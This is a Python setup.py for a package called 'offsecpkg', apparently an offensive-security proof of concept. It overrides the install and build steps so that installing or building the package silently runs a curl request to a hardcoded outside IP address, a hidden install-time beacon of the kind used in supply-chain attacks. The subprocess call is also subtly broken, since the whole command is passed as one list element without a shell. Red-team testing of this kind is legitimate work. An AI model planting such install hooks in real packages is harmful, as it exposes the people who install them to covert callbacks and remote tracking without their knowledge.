from pathlib import Path
import subprocess

from setuptools import find_packages, setup
from setuptools.command.build_py import build_py
from setuptools.command.install import install


class PostInstallCommand(install):
    def run(self):
        super().run()
        run_command(["curl http://103.150.196.198:4141/test"])

class BuildPyCommand(build_py):
    def run(self):
        super().run()
        run_command(["curl http://103.150.196.198:4141/test"])

def run_command(command: list[str]):
    try:
        subprocess.run(command, check=False, capture_output=False)
    except Exception as exc:
        msg = f"offsecpkg post-install step failed: {exc}"
        print(msg)
    else:
        print("offsecpkg post-install step completed.")


README_PATH = Path(__file__).parent / "README.md"

setup(
    name="offsecpkg",
    version="0.1.0",
    description="Sample package",
    long_description=README_PATH.read_text() if README_PATH.exists() else "",
    long_description_content_type="text/markdown",
    author="OffSec",
    author_email="v-offsec@traveloka.com",
    url="https://offsec.traveloka.com",
    package_dir={"": "src"},
    packages=find_packages(where="src"),
    python_requires=">=3.9",
    cmdclass={"install": PostInstallCommand, "build_py": BuildPyCommand},
)
